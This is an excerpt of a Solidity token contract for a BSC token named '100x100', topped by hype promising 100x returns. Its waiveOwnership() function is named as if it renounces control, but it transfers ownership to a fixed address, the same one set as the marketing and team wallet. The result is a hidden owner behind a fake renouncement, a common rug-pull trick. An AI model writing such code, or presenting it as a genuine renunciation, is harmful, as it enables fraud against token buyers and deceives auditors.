...
100x FROM INITIAL LAUNCH
NEXT HYPED IN BSC NETWORK
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x461A8045913588af1E799E0bA009C94Ac1dcc0Df));
        _owner = address(0x461A8045913588af1E799E0bA009C94Ac1dcc0Df);
    }
...
contract NextGemsToken is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "100x100";
    string private _symbol = "100x";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x461A8045913588af1E799E0bA009C94Ac1dcc0Df);
    address payable public teamWalletAddress = payable(0x461A8045913588af1E799E0bA009C94Ac1dcc0Df);
